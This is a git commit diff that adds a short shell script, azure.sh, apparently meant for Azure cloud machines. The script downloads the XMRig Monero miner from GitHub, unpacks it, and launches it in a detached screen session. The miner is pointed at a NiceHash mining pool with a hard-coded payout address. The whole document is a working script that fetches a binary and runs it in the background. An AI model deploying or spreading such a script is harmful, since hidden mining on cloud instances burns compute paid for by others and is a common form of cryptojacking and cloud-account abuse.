4538685c759c9d4b405c795e50dc53c25f0dae1a
recepatilga <117754976+recepatilga@users.noreply.github.com>
2022-11-27 05:52:36 +0300

    Update azure.sh

--- azure.sh
+++ azure.sh
@@ -1,1 +1,7 @@
-
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
+tar -xf xmrig-6.18.0-linux-x64.tar.gz
+cd xmrig-6.18.0
+screen -dmS run ./xmrig -a rx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 --tls -u 3FR6UXevgLcjmjmdzgnCWfSP6QP5xUSv9s.MDK
